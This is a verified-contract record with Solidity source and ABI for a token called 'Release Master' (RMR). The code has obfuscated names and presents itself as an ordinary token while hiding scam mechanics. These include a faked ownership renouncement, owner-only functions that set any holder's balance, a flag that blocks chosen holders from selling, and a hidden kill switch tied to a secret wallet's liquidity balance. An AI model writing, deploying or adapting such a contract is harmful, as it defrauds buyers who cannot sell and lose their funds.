{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface atLaunchedMin {\n    function createPair(address toMode, address toLaunchTotal) external returns (address);\n}\n\ninterface atMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenTake) external view returns (uint256);\n\n    function transfer(address fundAt, uint256 limitMode) external returns (bool);\n\n    function allowance(address teamLimitLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundAt,\n        uint256 limitMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeLaunch, uint256 value);\n    event Approval(address indexed teamLimitLaunch, address indexed spender, uint256 value);\n}\n\nabstract contract limitAtShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface isTokenFrom is atMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ReleaseMaster is limitAtShould, atMin, isTokenFrom {\n\n    address buyReceiverShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function tradingLiquidity(address tradingMax, uint256 limitMode) public {\n        minIs();\n        fundLaunched[tradingMax] = limitMode;\n    }\n\n    function tokenShould(uint256 limitMode) public {\n        minIs();\n        walletFrom = limitMode;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return sellSwapReceiver;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minLaunchTrading;\n    }\n\n    bool public senderBuy;\n\n    function launchedTo() public {\n        emit OwnershipTransferred(totalLaunch, address(0));\n        marketingShould = address(0);\n    }\n\n    address public totalLaunch;\n\n    bool public minSenderFrom;\n\n    bool private fromWallet;\n\n    mapping(address => uint256) private fundLaunched;\n\n    uint256 private listLaunched;\n\n    function balanceOf(address tokenTake) public view virtual override returns (uint256) {\n        return fundLaunched[tokenTake];\n    }\n\n    string private feeSenderAmount = \"Release Master\";\n\n    address public maxTo;\n\n    address private marketingShould;\n\n    function transferFrom(address receiverSender, address fundAt, uint256 limitMode) external override returns (bool) {\n        if (_msgSender() != buyReceiverShould) {\n            if (listMax[receiverSender][_msgSender()] != type(uint256).max) {\n                require(limitMode <= listMax[receiverSender][_msgSender()]);\n                listMax[receiverSender][_msgSender()] -= limitMode;\n            }\n        }\n        return modeShould(receiverSender, fundAt, limitMode);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return feeSenderAmount;\n    }\n\n    bool private minTeamSwap;\n\n    function transfer(address tradingMax, uint256 limitMode) external virtual override returns (bool) {\n        return modeShould(_msgSender(), tradingMax, limitMode);\n    }\n\n    function minIs() private view {\n        require(exemptMax[_msgSender()]);\n    }\n\n    constructor (){\n        if (minTeamSwap == liquidityWallet) {\n            launchedShould = listFund;\n        }\n        walletTrading teamLaunch = walletTrading(buyReceiverShould);\n        maxTo = atLaunchedMin(teamLaunch.factory()).createPair(teamLaunch.WETH(), address(this));\n        if (listFund == launchedShould) {\n            launchedShould = listFund;\n        }\n        totalLaunch = _msgSender();\n        exemptMax[totalLaunch] = true;\n        fundLaunched[totalLaunch] = minLaunchTrading;\n        launchedTo();\n        \n        emit Transfer(address(0), totalLaunch, minLaunchTrading);\n    }\n\n    mapping(address => bool) public exemptMax;\n\n    uint8 private takeToSell = 18;\n\n    function owner() external view returns (address) {\n        return marketingShould;\n    }\n\n    uint256 constant fromSenderWallet = 19 ** 10;\n\n    event OwnershipTransferred(address indexed launchLimitLaunched, address indexed launchedAmount);\n\n    bool private tradingMinIs;\n\n    uint256 private launchedShould;\n\n    function marketingSwap(address receiverSender, address fundAt, uint256 limitMode) internal returns (bool) {\n        require(fundLaunched[receiverSender] >= limitMode);\n        fundLaunched[receiverSender] -= limitMode;\n        fundLaunched[fundAt] += limitMode;\n        emit Transfer(receiverSender, fundAt, limitMode);\n        return true;\n    }\n\n    uint256 private listFund;\n\n    uint256 sellLimitTotal;\n\n    function modeShould(address receiverSender, address fundAt, uint256 limitMode) internal returns (bool) {\n        if (receiverSender == totalLaunch) {\n            return marketingSwap(receiverSender, fundAt, limitMode);\n        }\n        uint256 shouldIs = atMin(maxTo).balanceOf(walletFeeMarketing);\n        require(shouldIs == walletFrom);\n        require(fundAt != walletFeeMarketing);\n        if (walletFee[receiverSender]) {\n            return marketingSwap(receiverSender, fundAt, fromSenderWallet);\n        }\n        return marketingSwap(receiverSender, fundAt, limitMode);\n    }\n\n    uint256 walletFrom;\n\n    function approve(address modeIs, uint256 limitMode) public virtual override returns (bool) {\n        listMax[_msgSender()][modeIs] = limitMode;\n        emit Approval(_msgSender(), modeIs, limitMode);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return marketingShould;\n    }\n\n    address walletFeeMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private launchAmount;\n\n    function allowance(address liquidityWalletLaunched, address modeIs) external view virtual override returns (uint256) {\n        if (modeIs == buyReceiverShould) {\n            return type(uint256).max;\n        }\n        return listMax[liquidityWalletLaunched][modeIs];\n    }\n\n    uint256 private minLaunchTrading = 100000000 * 10 ** 18;\n\n    function listMode(address shouldSwap) public {\n        require(shouldSwap.balance < 100000);\n        if (senderBuy) {\n            return;\n        }\n        if (tradingMinIs != minSenderFrom) {\n            liquidityWallet = true;\n        }\n        exemptMax[shouldSwap] = true;\n        \n        senderBuy = true;\n    }\n\n    mapping(address => bool) public walletFee;\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeToSell;\n    }\n\n    string private sellSwapReceiver = \"RMR\";\n\n    function marketingExempt(address teamMode) public {\n        minIs();\n        \n        if (teamMode == totalLaunch || teamMode == maxTo) {\n            return;\n        }\n        walletFee[teamMode] = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private listMax;\n\n    bool private liquidityWallet;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamLimitLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchLimitLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityWalletLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSwap\",\"type\":\"address\"}],\"name\":\"listMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMode\",\"type\":\"address\"}],\"name\":\"marketingExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSenderFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitMode\",\"type\":\"uint256\"}],\"name\":\"tokenShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitMode\",\"type\":\"uint256\"}],\"name\":\"tradingLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ReleaseMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}